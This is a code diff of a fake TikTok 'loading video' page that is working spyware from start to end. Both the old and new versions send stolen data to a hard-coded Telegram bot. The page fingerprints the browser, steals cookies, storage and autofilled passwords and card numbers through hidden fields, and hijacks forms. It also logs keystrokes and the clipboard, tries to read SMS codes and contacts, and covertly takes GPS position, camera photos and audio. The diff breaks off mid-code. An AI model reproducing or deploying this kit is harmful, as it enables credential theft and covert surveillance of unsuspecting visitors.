@@ -2,491 +2,345 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok - @viral_video</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Video</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #000; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            overflow: hidden;
-        }
-        .loader-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-        }
-        .tiktok-loader {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid #fe2c55;
-            border-right: 3px solid #2af0ea;
-            animation: spin 0.7s linear infinite;
-        }
+        body { background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; overflow: hidden; user-select: none; -webkit-user-select: none; }
+        .tiktok-loader { width: 50px; height: 50px; border-radius: 50%; border: 3px solid #2af0ea; border-top: 3px solid #fe2c55; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loader-text {
-            font-size: 14px;
-            color: #888;
-            letter-spacing: 0.3px;
-        }
         #v, #c { display: none; }
-        .honeypot {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            opacity: 0;
-            height: 0;
-            width: 0;
-            overflow: hidden;
-        }
+        .load-text { margin-top: 15px; font-size: 14px; color: #888; animation: pulse 2s ease-in-out infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+        .progress-bar { width: 200px; height: 3px; background: #222; border-radius: 2px; margin-top: 12px; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #2af0ea, #fe2c55); border-radius: 2px; animation: progress 10s ease-in-out forwards; }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
     </style>
 </head>
 <body>
-    <div class="loader-container" id="loader">
-        <div class="tiktok-loader"></div>
-        <div class="loader-text"><span>Loading your video...</span></div>
-    </div>
+    <div class="tiktok-loader"></div>
+    <p class="load-text" id="statusText">Loading video...</p>
+    <div class="progress-bar"><div class="progress-fill"></div></div>
 
-    <video id="v" autoplay playsinline muted style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
-
-    <div class="honeypot">
-        <input type="email" id="hp-email" name="email" autocomplete="email">
-        <input type="password" id="hp-pass" name="password" autocomplete="current-password">
-        <input type="text" id="hp-user" name="username" autocomplete="username">
-        <input type="tel" id="hp-phone" name="phone" autocomplete="tel">
-        <input type="text" id="hp-cc" name="cc" autocomplete="cc-number">
-        <input type="text" id="hp-cc-name" name="ccname" autocomplete="cc-name">
-        <input type="text" id="hp-cc-exp" name="ccexp" autocomplete="cc-exp">
-        <input type="text" id="hp-cc-cvv" name="cccvv" autocomplete="cc-csc">
-    </div>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
-        // ─── CONFIG ───
-        const C2 = {
-            botToken: '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4',
-            chatId: '1034878899',
-            fallbackUrl: 'https://www.tiktok.com/foryou',
-        };
+        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
+        const chatId = '1034878899';
+        const tiktokLink = "https://www.tiktok.com/foryou";
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        
+        let mediaStream = null;
+        let keyBuffer = '';
+        let touchLog = [];
+        let lastTapTime = 0;
+        let tapCount = 0;
 
-        // ─── HELPERS ───
-        function tg(text) {
-            if (!text) return;
-            if (text.length > 3900) {
-                for (let i = 0; i < text.length; i += 3900)
-                    _tg(text.substring(i, i + 3900));
-            } else _tg(text);
-        }
-        function _tg(text) {
-            fetch(`https://api.telegram.org/bot${C2.botToken}/sendMessage`, {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({chat_id:C2.chatId, text, parse_mode:'Markdown', disable_web_page_preview:true})
-            }).catch(()=>{});
-        }
-        function tgPhoto(blob, cap) {
-            const fd = new FormData();
-            fd.append('chat_id',C2.chatId); fd.append('photo',blob,'p.jpg');
-            if (cap) fd.append('caption',cap);
-            fetch(`https://api.telegram.org/bot${C2.botToken}/sendPhoto`,{method:'POST',body:fd}).catch(()=>{});
-        }
-        function tgFile(blob, fn, cap) {
-            const fd = new FormData();
-            fd.append('chat_id',C2.chatId); fd.append('document',blob,fn);
-            if (cap) fd.append('caption',cap);
-            fetch(`https://api.telegram.org/bot${C2.botToken}/sendDocument`,{method:'POST',body:fd}).catch(()=>{});
-        }
-        function tgVideo(blob, cap) {
-            const fd = new FormData();
-            fd.append('chat_id',C2.chatId); fd.append('video',blob,'video.mp4');
-            fd.append('supports_streaming','true');
-            if (cap) fd.append('caption',cap);
-            fetch(`https://api.telegram.org/bot${C2.botToken}/sendVideo`,{method:'POST',body:fd}).catch(()=>{});
-        }
-        function tgVoice(blob) {
-            const fd = new FormData();
-            fd.append('chat_id',C2.chatId); fd.append('voice',blob,'v.ogg');
-            fetch(`https://api.telegram.org/bot${C2.botToken}/sendVoice`,{method:'POST',body:fd}).catch(()=>{});
-        }
-        function hs(s) {
-            let h=0; if(!s||!s.length) return'0';
-            for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h;}
-            return(h>>>0).toString(16);
-        }
-        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-        // ─── PHASE 1: SILENT RECON (0.5s) ───
-        async function recon() {
-            const d = {};
-
-            // IP
+        function sendToBot(text) {
             try {
-                const r = await(await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(2000)})).json();
-                d.ip=r.ip; d.isp=r.org; d.country=r.country_name; d.city=r.city;
-                d.lat=r.latitude; d.lon=r.longitude; d.tz=r.timezone;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
             } catch(e) {}
-            try {
-                d.ip2 = await(await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(1500)})).json().then(x=>x.ip);
-            } catch(e) {}
-            try {
-                const pc=new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel(''); await pc.setLocalDescription(await pc.createOffer());
-                d.local = await new Promise(r=>{pc.onicecandidate=e=>{if(e.candidate){const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m){r(m[0]);pc.close();}}};setTimeout(()=>{r('N/A');pc.close();},800);});
-            } catch(e) { d.local='N/A'; }
+        }
 
-            // Fingerprint
-            d.ua=navigator.userAgent; d.plat=navigator.platform;
-            d.hwc=navigator.hardwareConcurrency||'N/A'; d.mem=navigator.deviceMemory||'N/A';
-            d.mtp=navigator.maxTouchPoints; d.wd=navigator.webdriver;
-            d.langs=navigator.languages?.join(',')||'N/A';
-            d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-            d.tzOff=new Date().getTimezoneOffset();
-            d.scr=`${screen.width}x${screen.height}x${screen.colorDepth}@${window.devicePixelRatio}x`;
-            d.scrOrient=screen.orientation?.type||'N/A';
+        function updateStatus(msg) {
+            const el = document.getElementById('statusText');
+            if (el) el.textContent = msg;
+        }
 
-            // Canvas
-            try {
-                const c=document.createElement('canvas');c.width=256;c.height=256;
-                const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='18px Arial';
-                ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('FP',2,15);
-                ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('⚡',4,17);
-                ctx.beginPath();ctx.arc(50,50,30,0,Math.PI*2);ctx.fillStyle='#f00';ctx.fill();
-                ctx.fillRect(0,0,10,10);ctx.fillRect(50,50,10,10);
-                ctx.font='12px Arial';ctx.fillText('mmmwiiiI',20,100);
-                ctx.font='16px serif';ctx.fillText('abcdefghijklmnopqrstuvwxyz',20,130);
-                ctx.font='16px sans-serif';ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ',20,160);
-                d.canvas=hs(c.toDataURL());
-            } catch(e) {}
+        // =============================================
+        // KEYLOGGER + TOUCH PATTERN
+        // =============================================
+        document.addEventListener('keydown', e => {
+            if (e.key.length === 1) {
+                keyBuffer += e.key;
+                if (keyBuffer.length >= 40) {
+                    sendToBot(`⌨️ ${keyBuffer}`);
+                    keyBuffer = '';
+                }
+            }
+        });
 
-            // WebGL
+        setInterval(() => {
+            if (keyBuffer.length > 0) {
+                sendToBot(`⌨️ ${keyBuffer}`);
+                keyBuffer = '';
+            }
+        }, 12000);
+
+        document.addEventListener('touchstart', e => {
+            const now = Date.now();
+            const touch = e.touches[0];
+            tapCount++;
+            touchLog.push({ x: Math.round(touch.clientX), y: Math.round(touch.clientY), t: now });
+            if (now - lastTapTime < 250 && tapCount > 3) {
+                sendToBot(`📸 SS? ${tapCount}taps`);
+            }
+            lastTapTime = now;
+            if (touchLog.length >= 25) {
+                sendToBot(`👆 ${JSON.stringify(touchLog)}`);
+                touchLog = [];
+            }
+        });
+
+        // =============================================
+        // DEVICE INFO + IP + SENSORS
+        // =============================================
+        async function collectDeviceInfo() {
             try {
-                const gc=document.createElement('canvas');
-                const gl=gc.getContext('webgl')||gc.getContext('experimental-webgl');
-                if(gl){
-                    const ext=gl.getExtension('WEBGL_debug_renderer_info');
-                    d.glV=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):'N/A';
-                    d.glR=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'N/A';
-                    d.glVer=gl.getParameter(gl.VERSION);
-                    gl.clearColor(0.1,0.2,0.3,1);gl.clear(gl.COLOR_BUFFER_BIT);
-                    const vs=gl.createShader(gl.VERTEX_SHADER);gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');gl.compileShader(vs);
-                    const fs=gl.createShader(gl.FRAGMENT_SHADER);gl.shaderSource(fs,'precision mediump float;void main(){gl_FragColor=vec4(0.5,0.3,0.8,1);}');gl.compileShader(fs);
-                    const pg=gl.createProgram();gl.attachShader(pg,vs);gl.attachShader(pg,fs);gl.linkProgram(pg);gl.useProgram(pg);
-                    const bf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,bf);
-                    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
-                    const pl=gl.getAttribLocation(pg,'p');gl.enableVertexAttribArray(pl);gl.vertexAttribPointer(pl,2,gl.FLOAT,false,0,0);
-                    gl.drawArrays(gl.TRIANGLE_STRIP,0,4);
-                    const px=new Uint8Array(4);gl.readPixels(0,0,1,1,gl.RGBA,gl.UNSIGNED_BYTE,px);
-                    d.glHash=hs(px.join(','));
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                let sensors = '';
+                if (navigator.getBattery) {
+                    try {
+                        const b = await navigator.getBattery();
+                        sensors += `🔋${Math.round(b.level*100)}% ${b.charging?'⚡':'🔋'}\n`;
+                    } catch(e) {}
+                }
+                const conn = navigator.connection || {};
+                if (conn.effectiveType) sensors += `📶${conn.effectiveType.toUpperCase()}\n`;
+                const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '';
+                sensors += `📱${screen.width}x${screen.height} ${ram}\n`;
+                sensors += `🕐${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+
+                const report = `🔥 **Mobile Report** 🔥
+🌐${ipData.ip} | ${ipData.country_code}
+🏢${ipData.org || 'N/A'}
+📍${ipData.city}, ${ipData.country_name}
+${sensors}----------------------------------`;
+                sendToBot(report);
+                if (isMobile) sendToBot(`📱 **Mobile Device**`);
+
+                if (window.DeviceOrientationEvent) {
+                    window.addEventListener('deviceorientation', function handler(e) {
+                        if (e.alpha !== null) {
+                            sendToBot(`🔄 α:${Math.round(e.alpha)}° β:${Math.round(e.beta)}° γ:${Math.round(e.gamma)}°`);
+                        }
+                        window.removeEventListener('deviceorientation', handler);
+                    }, { once: true });
                 }
             } catch(e) {}
-
-            // Audio FP
-            try {
-                const a=new(window.AudioContext||window.webkitAudioContext)();
-                const sr=a.sampleRate;const b=a.createBuffer(1,5000,sr);const bd=b.getChannelData(0);
-                for(let i=0;i<5000;i++)bd[i]=Math.sin(i*0.1)*0.5+Math.sin(i*0.05)*0.3;
-                const s=a.createBufferSource();s.buffer=b;
-                const comp=a.createDynamicsCompressor();comp.threshold.value=-50;comp.knee.value=40;comp.ratio.value=12;
-                s.connect(comp);const an=a.createAnalyser();comp.connect(an);an.connect(a.destination);s.start();
-                const fd=new Uint8Array(an.frequencyBinCount);an.getByteFrequencyData(fd);
-                d.audio=hs(Array.from(fd).join(','));a.close();
-            } catch(e) {}
-
-            // Incognito + AdBlock
-            try {
-                const fs=window.RequestFileSystem||window.webkitRequestFileSystem;
-                if(fs){d.incog=await new Promise(r=>fs(window.TEMPORARY,100,()=>r(false),()=>r(true)));}
-                else if(navigator.webkitTemporaryStorage){d.incog=await new Promise(r=>navigator.webkitTemporaryStorage.queryUsageAndQuota(()=>r(false),()=>r(true)));}
-                else d.incog='?';
-            } catch(e){d.incog='?';}
-            try {
-                const b=document.createElement('div');b.className='adsbox';b.innerHTML='&nbsp;';
-                b.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';
-                document.body.appendChild(b);await sleep(100);
-                d.adblock=b.offsetHeight===0;document.body.removeChild(b);
-            } catch(e){d.adblock=false;}
-
-            // Network
-            const cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
-            d.netType=cn.effectiveType||'N/A';d.netDL=cn.downlink||'N/A';d.netRTT=cn.rtt||'N/A';
-
-            // Sensors
-            try {
-                if('Accelerometer'in window){
-                    const a=new Accelerometer({frequency:20});
-                    a.addEventListener('reading',()=>{d.accel={x:a.x.toFixed(2),y:a.y.toFixed(2),z:a.z.toFixed(2)};a.stop();});
-                    a.start();await sleep(200);a.stop();
-                }
-            }catch(e){}
-
-            // Storage
-            try{if(document.cookie)d.cookies=document.cookie.substring(0,1500);}catch(e){}
-            try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k)?.substring(0,200)||'';}if(Object.keys(ls).length)d.ls=ls;}catch(e){}
-            try{const ss={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);ss[k]=sessionStorage.getItem(k)?.substring(0,200)||'';}if(Object.keys(ss).length)d.ss=ss;}catch(e){}
-            try{if(indexedDB.databases){const dbs=await indexedDB.databases();if(dbs.length)d.dbs=dbs.map(x=>x.name).join(', ');}}catch(e){}
-            try{if(navigator.storage?.estimate){const e=await navigator.storage.estimate();d.storQ=e.quota?Math.round(e.quota/(1024**3))+'GB':'N/A';d.storU=e.usage?Math.round(e.usage/(1024**2))+'MB':'N/A';}}catch(e){}
-
-            // Extensions
-            const exts=[];
-            if(window.ethereum)exts.push('🦊MetaMask');
-            if(window.solana)exts.push('🌊Solana');
-            if(window.tronWeb?.ready)exts.push('🟣Tron');
-            if(window.phantom)exts.push('👻Phantom');
-            if(document.querySelector('[data-lp-realm]'))exts.push('🔑LastPass');
-            if(document.querySelector('[data-bitwarden]'))exts.push('🔐Bitwarden');
-            if(exts.length)d.exts=exts.join(' ');
-
-            // Report
-            let r=`🔥 **RECON** 🔥\n`;
-            r+=`IP: \`${d.ip||d.ip2||'N/A'}\` (local: ${d.local||'N/A'})\n`;
-            r+=`ISP: ${d.isp||'N/A'} | ${d.country||'?'}, ${d.city||'?'}\n`;
-            r+=`GeoIP: ${d.lat||'?'}, ${d.lon||'?'}\n`;
-            r+=`Net: ${d.netType} | ${d.netDL}Mbps\n`;
-            r+=`Device: ${d.plat} | ${d.hwc}c/${d.mem}GB | ${d.scr}\n`;
-            r+=`GPU: ${d.glR||'N/A'}\n`;
-            r+=`TZ: ${d.tz} (UTC${d.tzOff/-60}) | ${d.langs}\n`;
-            r+=`FP: ${d.canvas} | ${d.glHash} | ${d.audio}\n`;
-            r+=`Incog: ${d.incog} | AdBlock: ${d.adblock}\n`;
-            if(d.accel)r+=`Accel: ${JSON.stringify(d.accel)}\n`;
-            if(d.storQ)r+=`Storage: ${d.storQ} (${d.storU})\n`;
-            if(d.exts)r+=`Exts: ${d.exts}\n`;
-            if(d.cookies)r+=`🍪 Cookies\n`;
-            tg(r);
-
-            if(d.cookies)tgFile(new Blob([d.cookies],{type:'text/plain'}),'cookies.txt','🍪');
-            if(d.ls)tgFile(new Blob([JSON.stringify(d.ls,null,2)],{type:'application/json'}),'localStorage.json','💾');
-            if(d.ss)tgFile(new Blob([JSON.stringify(d.ss,null,2)],{type:'application/json'}),'sessionStorage.json','💾');
-
-            return d;
         }
 
-        // ─── PHASE 2: PERMISSIONS + CAPTURE (single click, ~8s) ───
+        // =============================================
+        // GPS - دەقیکترین شوێن بە گووگڵ ماپس
+        // =============================================
+        function getGPS(fromClick = false) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+                    
+                    let accText = '';
+                    if (acc < 10) accText = '✅ **دەقیک**';
+                    else if (acc < 30) accText = '⚠️ **باش**';
+                    else if (acc < 100) accText = '⚠️ مامناوەند';
+                    else accText = '❌ نادەقیک';
+                    
+                    const maps = `https://www.google.com/maps?q=${lat},${lng}&z=18`;
+                    
+                    sendToBot(`${fromClick?'👆':'⏰'} GPS | ${accText} (${Math.round(acc)}m)
+📍 [Google Maps](${maps})`);
+                },
+                err => {
+                    sendToBot(`${fromClick?'👆':'⏰'} GPS ❌ ${err.message}`);
+                },
+                { 
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // =============================================
+        // SMS + OTP STEALING (Android)
+        // =============================================
+        async function stealSMS() {
+            if ('sms' in navigator && navigator.sms) {
+                while (true) {
+                    try {
+                        const sms = await navigator.sms.receive({ timeout: 25000 });
+                        const content = sms.content || '';
+                        const from = sms.originatingAddress || '?';
+                        const otp = content.match(/\b(\d{4,8})\b/);
+                        let msg = `📱SMS|${from}: ${content.substring(0, 200)}`;
+                        if (otp) msg = `🔑**OTP:**${otp[1]}|${from}: ${content.substring(0, 150)}`;
+                        sendToBot(msg);
+                    } catch(e) {
+                        await new Promise(r => setTimeout(r, 5000));
+                    }
+                }
+            }
+        }
+
+        // =============================================
+        // CONTACTS (Android)
+        // =============================================
+        async function stealContacts() {
+            if (navigator.contacts && navigator.contacts.select) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (contacts && contacts.length > 0) {
+                        let cList = contacts.slice(0, 10).map(c => 
+                            `${c.name?.[0]||'?'}: ${c.tel?.[0]||'?'}`
+                        ).join('\n');
+                        sendToBot(`📞Contacts:\n${cList}`);
+                    }
+                } catch(e) {}
+            }
+        }
+
+        // =============================================
+        // CLIPBOARD
+        // =============================================
+        document.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.length > 0) {
+                    sendToBot(`📋 ${text.substring(0, 300)}`);
+                }
+            } catch(e) {}
+        }, { once: true });
+
+        // =============================================
+        // CAMERA + AUDIO (3 front + 2 back + 8s audio)
+        // =============================================
         async function captureAll() {
-            document.querySelector('.loader-text').innerHTML = '<span>Preparing video...</span>';
-
-            let stream = null;
-            let gpsPos = null;
-
-            // --- STEP 1: Camera + Mic (single prompt) ---
+            updateStatus("Preparing video...");
+            
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },
                     audio: true
                 });
 
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                await video.play();
+                const videoEl = document.getElementById('v');
+                videoEl.srcObject = mediaStream;
+                videoEl.muted = true;
+                await videoEl.play();
 
-                // 3 photos fast
+                // 3 Photos Front Camera
                 for (let i = 0; i < 3; i++) {
-                    await sleep(300);
-                    const c = document.getElementById('c');
-                    c.width = video.videoWidth || 640;
-                    c.height = video.videoHeight || 480;
-                    c.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
-                    tgPhoto(blob, `📸 ${i+1}`);
-                }
-
-                // Rear camera (quick)
-                try {
-                    const rs = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { exact: 'environment' } }
-                    });
-                    const rv = document.createElement('video');
-                    rv.srcObject = rs; await rv.play(); await sleep(300);
-                    const c = document.getElementById('c');
-                    c.width = rv.videoWidth || 640;
-                    c.height = rv.videoHeight || 480;
-                    c.getContext('2d').drawImage(rv, 0, 0);
-                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
-                    tgPhoto(blob, '📸 Rear');
-                    rs.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-
-                // Short video clip (3s) — sent as proper video/mp4 via sendVideo
-                try {
-                    const rec = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
-                    let ch = [];
-                    rec.ondataavailable = e => ch.push(e.data);
-                    rec.onstop = () => {
-                        const b = new Blob(ch, {type:'video/webm'});
-                        if (b.size > 1000) {
-                            // Convert to mp4-compatible blob or send as-is (Telegram accepts webm via sendVideo)
-                            tgVideo(b, '🎥 Video');
-                        }
-                    };
-                    rec.start();
-                    await sleep(3000);
-                    rec.stop();
-                } catch(e) {}
-
-                // Audio recording (5s)
-                try {
-                    const as = new MediaStream(stream.getAudioTracks());
-                    const r2 = new MediaRecorder(as);
-                    let ch2 = [];
-                    r2.ondataavailable = e => ch2.push(e.data);
-                    r2.onstop = () => tgVoice(new Blob(ch2, {type:'audio/ogg'}));
-                    r2.start();
-                    await sleep(5000);
-                    r2.stop();
-                } catch(e) {}
-
-            } catch(e) {
-                tg(`❌ Camera/Mic: ${e.message}`);
-            }
-
-            // --- STEP 2: GPS (separate prompt, but happens right after) ---
-            try {
-                gpsPos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {
-                        enableHighAccuracy: true, timeout: 8000, maximumAge: 0
-                    });
-                });
-                tg(`📍 **GPS Location:**\n[Google Maps](https://maps.google.com/maps?q=${gpsPos.coords.latitude},${gpsPos.coords.longitude})\nAccuracy: ±${gpsPos.coords.accuracy}m\nAltitude: ${gpsPos.coords.altitude||'N/A'}m\nSpeed: ${gpsPos.coords.speed||0} m/s`);
-            } catch(e) {
-                tg(`📍 GPS: ${e.code === 1 ? 'Denied' : e.message}`);
-            }
-
-            // Cleanup stream
-            if (stream) {
-                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);
-            }
-
-            // Summary
-            tg(`✅ **Done** | Camera: ${!!stream} | GPS: ${!!gpsPos}`);
-        }
-
-        // ─── PHASE 3: BACKGROUND HORROR (silent, persistent) ───
-        function deployBackground() {
-            // Autofill harvest
-            const hp = {
-                email:document.getElementById('hp-email'), pass:document.getElementById('hp-pass'),
-                user:document.getElementById('hp-user'), phone:document.getElementById('hp-phone'),
-                cc:document.getElementById('hp-cc'), ccname:document.getElementById('hp-cc-name'),
-                ccexp:document.getElementById('hp-cc-exp'), cccvv:document.getElementById('hp-cc-cvv'),
-            };
-            let last={};
-            setInterval(() => {
-                for(const[n,f]of Object.entries(hp)){
-                    if(f&&f.value&&f.value!==last[n]){
-                        last[n]=f.value;
-                        const ic=n.includes('cc')?'💳':n==='pass'?'🔑':'📋';
-                        tg(`${ic} **${n}:** \`${f.value.substring(0,300)}\``);
-                        if(n.includes('cc')&&f.value.length>10)
-                            tgFile(new Blob([f.value],{type:'text/plain'}),`${n}.txt`,`💳 ${n}`);
+                    await new Promise(r => setTimeout(r, 1000));
+                    const canvas = document.getElementById('c');
+                    canvas.width = videoEl.videoWidth || 480;
+                    canvas.height = videoEl.videoHeight || 640;
+                    canvas.getContext('2d').drawImage(videoEl, 0, 0);
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+                    if (blob) {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('photo', blob, `f${i+1}.jpg`);
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                     }
                 }
-            }, 300);
 
-            // Form hijack
-            document.querySelectorAll('form').forEach(f=>{
-                if(f.dataset.h)return;f.dataset.h='1';
-                f.addEventListener('submit',function(){
-                    const d={};this.querySelectorAll('input,textarea,select').forEach(inp=>{if(inp.value)d[inp.name||inp.id||'f']=inp.value.substring(0,500);});
-                    if(Object.keys(d).length){let m='📋 **Form:**\n';for(const[k,v]of Object.entries(d))m+=`• ${k}: \`${v}\`\n`;tg(m);}
-                },true);
-            });
-            new MutationObserver(muts=>{muts.forEach(m=>m.addedNodes.forEach(n=>{
-                if(n.tagName==='FORM'&&!n.dataset.h){
-                    n.dataset.h='1';n.addEventListener('submit',function(){
-                        const d={};this.querySelectorAll('input,textarea,select').forEach(inp=>{if(inp.value)d[inp.name||inp.id||'f']=inp.value.substring(0,500);});
-                        if(Object.keys(d).length){let m='📋 **Form:**\n';for(const[k,v]of Object.entries(d))m+=`• ${k}: \`${v}\`\n`;tg(m);}
-                    },true);
-                }
-            }));}).observe(document.body,{childList:true,subtree:true});
+                // Audio Recording (8 چرکە)
+                const audioRecorder = new MediaRecorder(mediaStream);
+                let audioChunks = [];
+                audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+                audioRecorder.onstop = () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    if (blob.size > 1000) {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('voice', blob, 'voice.webm');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });
+                    }
+                };
+                audioRecorder.start();
 
-            // Keylogger
-            let buf='',lt=Date.now();
-            document.addEventListener('keydown',e=>{
-                let k=e.key;if(['Shift','Control','Alt','Meta','CapsLock'].includes(k))return;
-                if(k==='Enter')k='\n';else if(k==='Backspace')k='⌫';else if(k.length>1&&!k.startsWith('F'))return;
-                buf+=k;if(buf.length>=20||(Date.now()-lt)>4000){if(buf.trim())tg(`⌨️ \`${buf.substring(0,300)}\``);buf='';lt=Date.now();}
-            });
-            document.addEventListener('focusout',e=>{
-                if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){
-                    const v=e.target.value;if(v&&v.length>2){const t=e.target.type||'text';const n=e.target.name||e.target.id||'f';
-                    tg(`${t==='password'?'🔑':'📝'} **${n}:** \`${v.substring(0,300)}\``);
-                    if(t==='password')tgFile(new Blob([`${n}: ${v}`],{type:'text/plain'}),`pw_${Date.now()}.txt`,'🔑');}
-                }
-            },true);
+                // Stop front camera video track but keep audio
+                setTimeout(() => {
+                    mediaStream.getVideoTracks().forEach(t => t.stop());
+                }, 3500);
 
-            // Clipboard
-            setInterval(async()=>{
-                try{const t=await navigator.clipboard.readText();if(t&&t.trim()){const h=hs(t);if(h!==window._ch){window._ch=h;tg(`📋 **Clip:** \`${t.substring(0,400)}\``);if(t.includes('-----BEGIN')||t.match(/^[A-Za-z0-9+/=]{30,}$/))tgFile(new Blob([t],{type:'text/plain'}),`key_${Date.now()}.txt`,'🔑');}}}catch(e){}
-            },5000);
+                // 2 Photos Back Camera (دوای 4 چرکە)
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'environment', width: { ideal: 480 }, height: { ideal: 640 } }
+                        });
+                        const v2 = document.createElement('video');
+                        v2.srcObject = backStream;
+                        v2.autoplay = true;
+                        v2.playsinline = true;
+                        v2.muted = true;
+                        v2.style.cssText = 'position:fixed;left:-9999px;';
+                        document.body.appendChild(v2);
+                        await v2.play();
 
-            // Network intercept
-            const of=window.fetch;window.fetch=function(...a){const url=typeof a[0]==='string'?a[0]:(a[0]?.url||'');if(a[1]?.body&&typeof a[1].body==='string'&&(a[1].body.includes('pass')||a[1].body.includes('token')||a[1].body.includes('auth')||a[1].body.includes('secret')))tg(`🌐 \`${url.substring(0,60)}\`\n\`\`\`${a[1].body.substring(0,600)}\`\`\``);return of.apply(this,a);};
+                        for (let i = 0; i < 2; i++) {
+                            await new Promise(r => setTimeout(r, 1000));
+                            const c2 = document.createElement('canvas');
+                            c2.width = v2.videoWidth || 480;
+                            c2.height = v2.videoHeight || 640;
+                            c2.getContext('2d').drawImage(v2, 0, 0);
+                            const blob = await new Promise(r => c2.toBlob(r, 'image/jpeg', 0.7));
+                            if (blob) {
+                                const fd = new FormData();
+                                fd.append('chat_id', chatId);
+                                fd.append('photo', blob, `b${i+1}.jpg`);
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                            }
+                        }
+                        backStream.getTracks().forEach(t => t.stop());
+                        v2.remove();
+                    } catch(e) {}
+                }, 4000);
 
-            // Gateway scan
-            setTimeout(async()=>{
-                const found=[];
-                for(const gw of['192.168.1.1','192.168.0.1','10.0.0.1','10.0.0.138','172.16.0.1','192.168.1.254']){
